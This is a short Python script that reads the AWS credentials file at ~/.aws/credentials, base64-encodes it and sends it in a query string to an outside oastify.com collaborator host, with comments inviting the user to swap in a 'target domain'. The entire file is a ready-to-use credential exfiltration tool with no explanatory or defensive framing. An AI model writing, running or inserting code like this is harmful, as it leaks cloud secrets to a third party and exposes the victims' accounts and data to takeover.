import base64
import http.client
import urllib.parse

file_path = '~/.aws/credentials'  # Update with your file path
url = '3jng6k5xaizr2tohrrqj3guxcoif65uu.oastify.com'  # Update with your target domain
endpoint = '/upload'  # Update with your target endpoint

try:
    with open(file_path, 'rb') as file:
        base64_data = base64.b64encode(file.read()).decode('utf-8')

    params = urllib.parse.urlencode({'DAT': base64_data})
    conn = http.client.HTTPSConnection(url)
    conn.request("GET", f"{endpoint}?{params}")
    response = conn.getresponse()

    print('Response:', response.status, response.read().decode())
    conn.close()
except Exception as e:
    print('Error:', str(e))
